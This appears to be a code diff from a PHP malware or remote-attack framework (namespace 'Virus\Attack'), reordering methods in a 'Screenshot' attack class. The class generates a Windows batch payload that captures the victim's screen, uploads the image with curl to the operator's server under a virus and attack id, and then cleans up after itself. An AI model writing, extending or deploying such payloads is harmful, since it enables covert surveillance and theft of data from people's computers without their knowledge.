@@ -15,19 +15,6 @@ use Kelvinho\Virus\Attack\BaseScriptWin;
  */
 class Screenshot extends AttackBase {
 
-    protected function setState(string $json): void {
-    }
-
-    protected function getState(): string {
-        return json_encode([]);
-    }
-
-    private function generateUploadCode(): string {
-        ob_start(); ?>
-        curl --form "screenshot=@%~pd0screen.png" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
-    }
-
     public function generateBatchCode(): string {
         ob_start(); //@formatter:off ?>
         @echo off
@@ -40,6 +27,12 @@ class Screenshot extends AttackBase {
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); ?>
         <?php echo BaseScriptWin::cleanUpPayload(); ?>
         <?php return ob_get_clean(); //@formatter:on
+    }
+
+    private function generateUploadCode(): string {
+        ob_start(); ?>
+        curl --form "screenshot=@%~pd0screen.png" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
     }
 
     public function processExtras(string $resourceIdentifier): void {
@@ -278,5 +271,12 @@ public class ScreenCapture {
                 <?php break; //@formatter:on
             default:
         }
+    }
+
+    protected function setState(string $json): void {
+    }
+
+    protected function getState(): string {
+        return json_encode([]);
     }
 }
